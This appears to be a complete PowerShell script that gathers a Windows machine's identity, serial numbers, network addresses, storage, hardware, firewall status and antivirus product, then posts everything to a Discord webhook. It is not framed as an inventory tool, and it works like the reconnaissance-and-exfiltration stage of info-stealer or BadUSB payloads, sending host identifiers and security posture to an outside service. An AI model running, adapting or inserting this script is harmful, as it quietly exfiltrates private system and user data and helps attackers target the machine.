param(
    [Parameter(Mandatory=$false)]
    [string]$WebhookUrl = "YOUR-WEBHOOK-URL-HERE"
)

function Send-ToDiscord {
    param($webhook, $content)
    try {
        $payload = @{
            content = "```$content```"
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
    } catch {
        Write-Warning "Failed to send to Discord: $_"
    }
}

function Get-SystemInfo {
    param($webhook)
    
    try {
        $info = @()
        $info += "=== SYSTEM INFORMATION REPORT ==="
        $info += "Timestamp: $(Get-Date)"
        $info += "===================="
        
        # System Info
        $os = Get-WmiObject Win32_OperatingSystem
        $cs = Get-WmiObject Win32_ComputerSystem
        $bios = Get-WmiObject Win32_BIOS
        
        $info += "`nSYSTEM:"
        $info += "Computer Name: $env:COMPUTERNAME"
        $info += "Username: $env:USERNAME"
        $info += "OS: $($os.Caption) $($os.OSArchitecture)"
        $info += "OS Serial: $($os.SerialNumber)"
        $info += "Manufacturer: $($cs.Manufacturer)"
        $info += "Model: $($cs.Model)"
        $info += "BIOS Serial: $($bios.SerialNumber)"
        
        # Network Info
        $info += "`nNETWORK:"
        Get-NetAdapter | Where-Object Status -eq "Up" | ForEach-Object {
            $info += "Adapter: $($_.Name)"
            $info += "MAC: $($_.MacAddress)"
            $addresses = Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4
            $info += "IP: $($addresses.IPAddress -join ', ')"
        }
        
        # Storage Info
        $info += "`nSTORAGE:"
        Get-WmiObject Win32_LogicalDisk | Where-Object DriveType -eq 3 | ForEach-Object {
            $size = [math]::Round($_.Size/1GB, 2)
            $free = [math]::Round($_.FreeSpace/1GB, 2)
            $info += "Drive $($_.DeviceID): $free GB free of $size GB"
        }
        
        # Hardware Info
        $info += "`nHARDWARE:"
        $cpu = Get-WmiObject Win32_Processor
        $ram = Get-WmiObject Win32_ComputerSystem
        $gpu = Get-WmiObject Win32_VideoController
        $info += "CPU: $($cpu.Name)"
        $info += "RAM: $([math]::Round($ram.TotalPhysicalMemory/1GB, 2)) GB"
        $info += "GPU: $($gpu.Name)"
        
        # Security Info
        $info += "`nSECURITY:"
        $fw = Get-NetFirewallProfile
        $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
        $info += "Firewall Status: $($fw.Enabled -join ', ')"
        $info += "Antivirus: $($av.displayName)"
        
        # Send to Discord in chunks (Discord has 2000 char limit)
        $content = $info -join "`n"
        $chunks = [regex]::Matches($content, ".{1,1900}")
        foreach ($chunk in $chunks) {
            Send-ToDiscord -webhook $webhook -content $chunk.Value
            Start-Sleep -Seconds 1
        }
        
        Write-Output "System information sent to Discord"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Execute the info gathering
Get-SystemInfo -webhook $WebhookUrl
